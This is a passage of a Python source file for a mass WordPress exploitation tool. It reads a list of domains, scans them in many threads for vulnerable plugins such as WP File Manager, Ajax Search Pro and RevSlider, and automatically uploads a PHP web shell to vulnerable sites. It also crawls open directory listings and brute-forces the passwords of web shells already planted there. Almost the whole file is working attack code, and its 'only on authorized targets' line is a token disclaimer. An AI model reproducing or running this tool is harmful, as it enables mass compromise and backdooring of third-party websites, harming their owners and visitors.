            params = ['file', 'upload', 'Filedata', 'files[]', 'image', 'media', 'file_upload', 'filename']
            
            for param in params:
                try:
                    files = {param: (shell_name, SHELL_CONTENT, 'application/x-php')}
                    resp = self.session.post(target_url, files=files, timeout=10)
                    
                    if resp.status_code == 200:
                        # Try to parse JSON response for a URL
                        try:
                            json_data = resp.json()
                            for key in ['url', 'file', 'path', 'files', 'data']:
                                if key in json_data:
                                    url_val = json_data[key]
                                    if isinstance(url_val, str) and '.php' in url_val:
                                        if self.verify_shell(url_val):
                                            return True, f"Shell uploaded (JSON): {url_val}?p={SHELL_PASSWORD}"
                                    elif isinstance(url_val, list) and url_val and isinstance(url_val[0], dict):
                                        for sub_key in ['url', 'path', 'name']:
                                            if sub_key in url_val[0]:
                                                shell_path = url_val[0][sub_key]
                                                if self.verify_shell(shell_path):
                                                    return True, f"Shell uploaded (JSON): {shell_path}?p={SHELL_PASSWORD}"
                        except:
                            pass # Not JSON, proceed to path guessing

                        # Guess possible locations
                        base_dir = target_url.rsplit('/', 1)[0]
                        paths = [
                            urljoin(base_dir + '/', shell_name),
                            urljoin(target_url, shell_name),
                            urljoin(target_url, f'../{shell_name}'),
                            urljoin(target_url, f'../../{shell_name}'),
                            urljoin(target_url, f'../../../{shell_name}'),
                            urljoin(target_url, f'wp-content/uploads/{shell_name}'),
                            urljoin(target_url, f'wp-content/uploads/{time.strftime("%Y/%m")}/{shell_name}')
                        ]
                        
                        for p in paths:
                            if self.verify_shell(p):
                                return True, f"Shell uploaded: {p}?p={SHELL_PASSWORD}"
                except:
                    continue
        except:
            pass
        return False, "Generic upload failed"

    def crawl_directory_listing(self, url, current_depth=0, max_depth=5):
        found_shells = []
        if current_depth > max_depth:
            return found_shells
            
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                # Improved regex to capture more link formats
                links = re.findall(r'href=["\']?([^"\' >]+)', response.text)
                
                # Filter links to process
                for link in links:
                    # Clean link
                    link = link.split('?')[0].split('#')[0]
                    
                    # Skip parent dir, query params, absolute urls
                    if not link or link.startswith('?') or '://' in link or link.startswith('../') or link in ['Name', 'Last modified', 'Size', 'Description', 'Parent Directory', '/']:
                        continue
                        
                    full_url = urljoin(url, link)
                    
                    # Ensure we stay in the target directory or subdirectories (don't go up to root)
                    if not full_url.startswith(url):
                        continue

                    ext = os.path.splitext(link)[1].lower()

                    # Case 1: It's a PHP file -> Check for shell
                    if ext in ['.php', '.phtml', '.php5', '.php7', '.inc', '.php4']:
                        try:
                            file_resp = self.session.get(full_url, timeout=5)
                            if file_resp.status_code == 200:
                                if self.verify_shell(full_url):
                                    found_shells.append(f"{full_url}?p={SHELL_PASSWORD}")
                                    print(f"    {GREEN}[FOUND]{RESET} Shell found: {full_url}")
                                elif self.is_shell(file_resp.text):
                                    print(f"    {YELLOW}[*]{RESET} Shell detected, attempting brute force: {full_url}")
                                    bf_pass, bf_param = self.brute_force_shell(full_url)
                                    if bf_pass:
                                        if bf_pass == "nopass":
                                            shell_entry = full_url
                                        else:
                                            shell_entry = f"{full_url}?{bf_param}={bf_pass}"
                                        found_shells.append(shell_entry)
                                        print(f"    {GREEN}[FOUND]{RESET} Shell cracked: {shell_entry}")
                                    else:
                                        found_shells.append(full_url)
                                        print(f"    {GREEN}[FOUND]{RESET} Shell found (unknown pass): {full_url}")
                        except:
                            pass
                    
                    # Case 2: It's a directory -> Recurse
                    elif link.endswith('/') or ('.' not in link and not ext):
                        # Avoid infinite loops
                        if full_url.rstrip('/') == url.rstrip('/'):
                            continue
                        # print(f"    {CYAN}[CRAWL]{RESET} Entering: {full_url}")
                        found_shells.extend(self.crawl_directory_listing(full_url, current_depth + 1, max_depth))
                        
        except:
            pass
        return found_shells
    
    def check_writable_directories(self, target_url):
        test_directories = [
            'wp-content/uploads/',
            'wp-content/plugins/',
            'wp-content/themes/',
            'wp-includes/',
            'wp-admin/'
        ]
        
        found_shells = []
        writable_dirs = []
        
        for directory in test_directories:
            test_url = urljoin(target_url, directory)
            
            try:
                response = self.session.get(test_url, timeout=3)
                
                if response.status_code == 200:
                    if 'Index of' in response.text or '<title>Index of' in response.text:
                        writable_dirs.append(directory)
                        print(f"{GREEN}[+]{RESET} Directory listing enabled: {test_url}")
                        
                        # Auto Exploit Index Of
                        print(f"{CYAN}[*]{RESET} Attempting Index Of exploit...")
                        idx_success, idx_shell = self.exploit_index_of(test_url)
                        if idx_success:
                            found_shells.append(f"{idx_shell}?p={SHELL_PASSWORD}")
                            print(f"{GREEN}[SHELL]{RESET} Index Of Exploit Success: {idx_shell}")
                        
                        # Auto crawl files
                        print(f"{CYAN}[*]{RESET} Crawling directory recursively for shells...")
                        shells = self.crawl_directory_listing(test_url)
                        if shells:
                            found_shells.extend(shells)
                
                elif response.status_code == 403:
                    print(f"{YELLOW}[!]{RESET} Directory forbidden: {test_url}")
                
            except:
                pass
        
        return writable_dirs, found_shells
    
    def auto_exploit(self, target_url):
        results = {
            'file_manager': False,
            'ajax_search': False,
            'revslider': False,
            'brute_upload': False,
            'shell_urls': [],
            'details': []
        }
        
        print(f"{CYAN}[*]{RESET} Checking writable directories...")
        writable_dirs, found_shells = self.check_writable_directories(target_url)
        if writable_dirs:
            results['details'].append(f"{GREEN}[+] Writable directories: {', '.join(writable_dirs)}{RESET}")
        if found_shells:
            results['shell_urls'].extend(found_shells)
        
        print(f"{CYAN}[*]{RESET} Testing WP File Manager exploit...")
        fm_result, fm_msg = self.exploit_wp_file_manager(target_url)
        results['file_manager'] = fm_result
        results['details'].append(f"{BLUE}[FileManager]{RESET} {fm_msg}")
        if fm_result:
            shell_part = fm_msg.split(': ')[1] if ': ' in fm_msg else fm_msg
            if shell_part not in results['shell_urls']:
                results['shell_urls'].append(shell_part)
        
        print(f"{CYAN}[*]{RESET} Testing Ajax Search Pro exploit...")
        ajax_result, ajax_msg = self.exploit_ajax_search_pro(target_url)
        results['ajax_search'] = ajax_result
        results['details'].append(f"{MAGENTA}[AjaxSearch]{RESET} {ajax_msg}")
        if ajax_result:
            shell_part = ajax_msg.split(': ')[1] if ': ' in ajax_msg else ajax_msg
            if shell_part not in results['shell_urls']:
                results['shell_urls'].append(shell_part)
        
        print(f"{CYAN}[*]{RESET} Testing RevSlider exploit...")
        rev_result, rev_msg = self.exploit_revslider(target_url)
        results['revslider'] = rev_result
        results['details'].append(f"{YELLOW}[RevSlider]{RESET} {rev_msg}")
        if rev_result:
            shell_part = rev_msg.split(': ')[1] if ': ' in rev_msg else rev_msg
            if shell_part not in results['shell_urls']:
                results['shell_urls'].append(shell_part)
        
        print(f"{CYAN}[*]{RESET} Testing brute force upload...")
        brute_result, brute_msg = self.brute_force_upload(target_url)
        results['brute_upload'] = brute_result
        results['details'].append(f"{WHITE}[BruteUpload]{RESET} {brute_msg}")
        if brute_result:
            shell_part = brute_msg.split(': ')[1] if ': ' in brute_msg else brute_msg
            if shell_part not in results['shell_urls']:
                results['shell_urls'].append(shell_part)
        
        print(f"{CYAN}[*]{RESET} Testing Classic Editor Bypass...")
        ce_result, ce_msg = self.exploit_classic_editor_bypass(target_url)
        if ce_result:
            shell_part = ce_msg.split(': ')[1] if ': ' in ce_msg else ce_msg
            if shell_part not in results['shell_urls']:
                results['shell_urls'].append(shell_part)
            results['details'].append(f"{GREEN}[ClassicEditor]{RESET} {ce_msg}")
        
        if not any([fm_result, ajax_result, rev_result, brute_result]):
            results['details'].append(f"{RED}[!]{RESET} All exploit attempts failed")
        
        return results

def scan_vulnerable_plugins(target_url, max_workers=20):
    results = []
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for plugin in WP_VULN_PLUGINS:
            test_url = urljoin(target_url, plugin['path'])
            keywords = plugin.get('keywords', [])
            futures.append(executor.submit(check_plugin_vulnerability, test_url, plugin['name'], keywords))
        
        for future in as_completed(futures):
            try:
                result = future.result(timeout=3)
                if result.get('vulnerable', False):
                    results.append(result)
            except:
                continue
    
    return results

def check_plugin_vulnerability(url, plugin_name, keywords=None):
    try:
        response = requests.get(url, timeout=5, verify=False, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        if response.status_code == 200:
            content = response.text
            
            # Filter blank pages and soft 404s/hacked pages
            if not content.strip() or len(content) < 10 or any(x in content.lower() for x in ['404 not found', 'page not found', 'error 404', 'hacked by', 'hacked', 'defaced', 'forbidden', 'access denied', 'internal server error']):
                return {
                    'plugin': plugin_name,
                    'url': url,
                    'vulnerable': False,
                    'status_code': response.status_code
                }

            # Filter login pages (False Positive Fix)
            if 'wp-login.php' in response.url or any(x in content.lower() for x in ['user_login', 'user_pass', 'wp-submit', 'loginform', 'your profile', 'lost your password', 'username or email', 'log in']):
                return {
                    'plugin': plugin_name,
                    'url': url,
                    'vulnerable': False,
                    'status_code': response.status_code
                }

            # Filter gambling/spam pages (Judol Fix)
            if any(x in content.lower() for x in JUDOL_KEYWORDS):
                return {
                    'plugin': plugin_name,
                    'url': url,
                    'vulnerable': False,
                    'status_code': response.status_code
                }

            # Check keywords if provided
            if keywords:
                found_keyword = False
                for keyword in keywords:
                    if keyword.lower() in content.lower():
                        found_keyword = True
                        break
                
                if not found_keyword:
                    return {
                        'plugin': plugin_name,
                        'url': url,
                        'vulnerable': False,
                        'status_code': response.status_code
                    }

            return {
                'plugin': plugin_name,
                'url': url,
                'vulnerable': True,
                'status_code': response.status_code,
                'content_preview': response.text[:200]
            }
        else:
            return {
                'plugin': plugin_name,
                'url': url,
                'vulnerable': False,
                'status_code': response.status_code
            }
            
    except Exception as e:
        return {
            'plugin': plugin_name,
            'url': url,
            'vulnerable': False,
            'error': str(e)
        }

def check_wordpress_site(base_url):
    wp_indicators = ['wp-content', 'wp-includes', 'wp-admin', 'wp-json', '/wp-login.php']
    
    try:
        response = requests.get(base_url, timeout=5, verify=False)
        content = response.text.lower()
        
        for indicator in wp_indicators:
            if indicator in content:
                return True
        
        login_paths = ['wp-login.php', 'wp-admin', 'login', 'admin']
        for path in login_paths:
            test_url = urljoin(base_url, path)
            try:
                resp = requests.get(test_url, timeout=3, verify=False)
                if resp.status_code == 200:
                    return True
            except:
                continue
    except:
        pass
    
    return False

def scan_single_target(target_url, exploit=False):
    result = {
        'url': target_url,
        'is_wordpress': False,
        'vulnerable_plugins': [],
        'exploit_results': {},
        'shell_urls': []
    }
    
    if not target_url.startswith('http'):
        target_url = 'http://' + target_url
    
    result['url'] = target_url
    
    result['is_wordpress'] = check_wordpress_site(target_url)
    
    if result['is_wordpress']:
        print(f"{GREEN}[+]{RESET} WordPress detected: {target_url}")
        
        plugin_results = scan_vulnerable_plugins(target_url, max_workers=30)
        result['vulnerable_plugins'] = plugin_results
        
        if plugin_results:
            print(f"{YELLOW}[!]{RESET} Found {len(plugin_results)} potentially vulnerable plugins")
            for plugin in plugin_results[:5]:
                print(f"  {CYAN}-{RESET} {plugin['plugin']}: {plugin['url']}")
        
        if exploit:
            exploiter = WPFileManagerExploit()
            
            # Try to exploit specifically found vulnerable plugins first
            if plugin_results:
                print(f"{CYAN}[*]{RESET} Attempting to exploit found plugins...")
                for plugin in plugin_results:
                    name = plugin['plugin']
                    url = plugin['url']
                    success = False
                    msg = ""

                    if name in ['wp-file-manager', 'wp-file-manager-old']:
                        success, msg = exploiter.exploit_wp_file_manager(target_url)
                    elif name == 'ajax-search-pro':
                        success, msg = exploiter.exploit_ajax_search_pro(target_url)
                    elif name == 'revslider':
                        success, msg = exploiter.exploit_revslider(target_url)
                    else:
                        success, msg = exploiter.attempt_generic_upload(url)

                    if success:
                        shell_url = msg.split(': ')[1] if ': ' in msg else msg
                        if shell_url not in result['shell_urls']:
                            result['shell_urls'].append(shell_url)
                        print(f"  {GREEN}[SHELL]{RESET} {msg}")
                    else:
                        print(f"  {RED}[FAIL]{RESET} Exploit failed for {name}: {msg}")
            
            exploit_result = exploiter.auto_exploit(target_url)
            result['exploit_results'] = exploit_result
            for shell in exploit_result.get('shell_urls', []):
                if shell not in result['shell_urls']:
                    result['shell_urls'].append(shell)
    
    return result

def mass_scan_targets(targets, max_workers=50, exploit=False):
    results = []
    wp_sites = 0
    vulnerable_sites = 0
    exploited_sites = 0
    shells_uploaded = 0
    total = len(targets)
    completed = 0
    start_time = time.time()
    
    print(f"\n{BLUE}[*]{RESET} Starting WP Exploit Scanner for {CYAN}{total}{RESET} targets")
    if exploit:
        print(f"{RED}[!]{RESET} AUTO EXPLOIT MODE ENABLED - Shell upload attempts will be made")
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_target = {executor.submit(scan_single_target, target, exploit): target for target in targets}
        
        for future in as_completed(future_to_target):
            completed += 1
            try:
                result = future.result(timeout=30)
                
                if result['is_wordpress']:
                    wp_sites += 1
                    
                    is_exploited = bool(result['shell_urls'])
                    is_vuln = bool(result['vulnerable_plugins'])

                    if is_exploited:
                        exploited_sites += 1
                        shells_uploaded += len(result['shell_urls'])
                    if is_vuln:
                        vulnerable_sites += 1

                    if is_exploited:
                        print(f"\n{GREEN}[EXPLOITED]{RESET} {WHITE}{result['url']}{RESET}")
                        if result['vulnerable_plugins']:
                            print(f"  {YELLOW}Via Plugins:{RESET} {len(result['vulnerable_plugins'])}")
                            for plugin in result['vulnerable_plugins'][:3]:
                                print(f"    {CYAN}[+]{RESET} {plugin['plugin']}")
                                print(f"      {MAGENTA}PoC:{RESET} {plugin['url']}")
                        
                        print(f"  {GREEN}[SHELL]{RESET} Found {len(result['shell_urls'])} shells")
                        for shell in result['shell_urls']:
                            print(f"    {GREEN}→{RESET} {shell}")

                    elif is_vuln:
                        print(f"\n{RED}[VULN]{RESET} {WHITE}{result['url']}{RESET}")
                        print(f"  {YELLOW}Vulnerable Plugins:{RESET} {len(result['vulnerable_plugins'])}")
                        for plugin in result['vulnerable_plugins'][:5]:
                            print(f"    {CYAN}[+]{RESET} {plugin['plugin']}")
                            print(f"      {MAGENTA}PoC:{RESET} {plugin['url']}")
                            print(f"      {WHITE}Status:{RESET} {plugin.get('status_code', 'N/A')}")
                        
                        if len(result['vulnerable_plugins']) > 5:
                            print(f"      {YELLOW}... and {len(result['vulnerable_plugins']) - 5} others{RESET}")

                        if exploit:
                            print(f"  {RED}[FAIL]{RESET} Auto-exploit attempted but no shell uploaded.")
                    
                    if result.get('exploit_results', {}).get('details'):
                        for detail in result['exploit_results']['details']:
                            if 'uploaded' in detail.lower() or 'shell' in detail.lower():
                                print(f"    {detail}")
                
                results.append(result)
                
                if completed % 10 == 0:
                    elapsed = time.time() - start_time
                    progress = (completed / total) * 100
                    rate = completed / elapsed if elapsed > 0 else 0
                    eta = (total - completed) / rate if rate > 0 else 0
                    
                    print(f"\n{BLUE}[{completed}/{total}]{RESET} {YELLOW}{progress:.1f}%{RESET} | {CYAN}WP: {wp_sites}{RESET} | {RED}Vuln: {vulnerable_sites}{RESET} | {GREEN}Exploited: {exploited_sites}{RESET} | {MAGENTA}Shells: {shells_uploaded}{RESET} | {WHITE}Rate: {rate:.1f}/s{RESET}")
                        
            except Exception as e:
                print(f"{RED}[ERROR]{RESET} Scan failed: {e}")
    
    total_time = time.time() - start_time
    print(f"\n{GREEN}[+]{RESET} Scan completed in {YELLOW}{total_time:.1f}{RESET} seconds")
    print(f"{CYAN}[+]{RESET} WordPress sites: {GREEN}{wp_sites}{RESET}")
    print(f"{RED}[+]{RESET} Vulnerable sites: {YELLOW}{vulnerable_sites}{RESET}")
    print(f"{GREEN}[+]{RESET} Exploited sites: {MAGENTA}{exploited_sites}{RESET}")
    print(f"{GREEN}[+]{RESET} Shells uploaded: {MAGENTA}{shells_uploaded}{RESET}")
    
    return results

def load_targets(filename):
    targets = []
    seen = set()
    
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    line = line.split('#')[0].strip()
                    
                    if '://' not in line:
                        line = 'http://' + line
                    
                    if line not in seen:
                        seen.add(line)
                        targets.append(line)
    except Exception as e:
        print(f"{RED}[!]{RESET} Error loading file: {e}")
    
    return targets

def save_results(results, filename="wp_exploit_results.txt"):
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=" * 100 + "\n")
            f.write("WORDPRESS FILE MANAGER EXPLOIT SCANNER RESULTS\n")
            f.write("=" * 100 + "\n\n")
            
            wp_count = len([r for r in results if r['is_wordpress']])
            vuln_count = len([r for r in results if r['vulnerable_plugins']])
            exploited_count = len([r for r in results if r['shell_urls']])
            shell_count = sum(len(r['shell_urls']) for r in results)
            
            f.write(f"SUMMARY:\n")
            f.write(f"- Total targets: {len(results)}\n")
            f.write(f"- WordPress sites: {wp_count}\n")
            f.write(f"- Vulnerable sites: {vuln_count}\n")
            f.write(f"- Exploited sites: {exploited_count}\n")
            f.write(f"- Shells uploaded: {shell_count}\n")
            f.write("=" * 100 + "\n\n")
            
            if vuln_count > 0:
                f.write("VULNERABLE SITES:\n")
                f.write("=" * 100 + "\n\n")
                
                for result in results:
                    if result['vulnerable_plugins']:
                        f.write(f"URL: {result['url']}\n")
                        f.write(f"Vulnerable Plugins: {len(result['vulnerable_plugins'])}\n")
                        
                        for plugin in result['vulnerable_plugins']:
                            f.write(f"  - {plugin['plugin']}: {plugin['url']}\n")
                        
                        if result['shell_urls']:
                            f.write("\nUPLOADED SHELLS:\n")
                            for shell in result['shell_urls']:
                                f.write(f"  → {shell}\n")
                        
                        if result.get('exploit_results', {}).get('details'):
                            f.write("\nEXPLOIT DETAILS:\n")
                            for detail in result['exploit_results']['details']:
                                clean_detail = re.sub(r'\033\[[0-9;]*m', '', detail)
                                f.write(f"  {clean_detail}\n")
                        
                        f.write("\n" + "=" * 100 + "\n\n")
            
    except Exception as e:
        print(f"{RED}[!]{RESET} Error saving results: {e}")

def main():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

    banner = f"""
{RED}
██╗    ██╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██║    ██║██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██║ █╗ ██║██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
██║███╗██║██╔═══╝     ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
╚███╔███╔╝██║         ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
 ╚══╝╚══╝ ╚═╝         ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                            
                           FILE MANAGER EXPLOIT SCANNER
{RESET}
"""
    
    print(banner)
    
    filename = input(f"\n{YELLOW}[?]{RESET} Enter filename with domains/URLs: ").strip()
    
    if not os.path.exists(filename):
        print(f"{RED}[!]{RESET} File not found: {filename}")
        return
    
    print(f"{BLUE}[*]{RESET} Loading targets...")
    targets = load_targets(filename)
    
    if not targets:
        print(f"{RED}[!]{RESET} No targets loaded")
        return
    
    print(f"{GREEN}[+]{RESET} Loaded {CYAN}{len(targets)}{RESET} targets")
    
    threads_input = input(f"{YELLOW}[?]{RESET} Threads [{CYAN}50{RESET}]: ").strip()
    max_workers = int(threads_input) if threads_input.isdigit() else 50
    max_workers = min(max_workers, 100)
    
    exploit_input = input(f"{YELLOW}[?]{RESET} Enable auto exploit/shell upload? ({GREEN}y{RESET}/{RED}n{RESET}): ").strip().lower()
    exploit = exploit_input == 'y'
    
    print(f"{BLUE}[*]{RESET} Starting scan with {CYAN}{max_workers}{RESET} threads...")
    if exploit:
        print(f"{RED}[!]{RESET} AUTO EXPLOIT ENABLED - Shell uploads will be attempted")
        print(f"{YELLOW}[!]{RESET} Use at your own risk and only on authorized targets")
    print(f"{YELLOW}[!]{RESET} Press Ctrl+C to stop")
    
    try:
        results = mass_scan_targets(targets, max_workers, exploit)
        
        if results:
            save_option = input(f"\n{YELLOW}[?]{RESET} Save results? ({GREEN}y{RESET}/{RED}n{RESET}): ").strip().lower()
            if save_option == 'y':
                save_filename = input(f"{YELLOW}[?]{RESET} Filename [{CYAN}wp_exploit_results.txt{RESET}]: ").strip()
                if not save_filename:
                    save_filename = "wp_exploit_results.txt"
                save_results(results, save_filename)
                print(f"{GREEN}[+]{RESET} Results saved to {CYAN}{save_filename}{RESET}")
        else:
            print(f"{BLUE}[i]{RESET} No WordPress sites found")
    
    except KeyboardInterrupt:
        print(f"\n{RED}[!]{RESET} Scan interrupted")
    except Exception as e:
        print(f"{RED}[!]{RESET} Scan error: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Exiting...{RESET}")
    except Exception as e:
        print(f"{RED}Fatal error: {e}{RESET}")
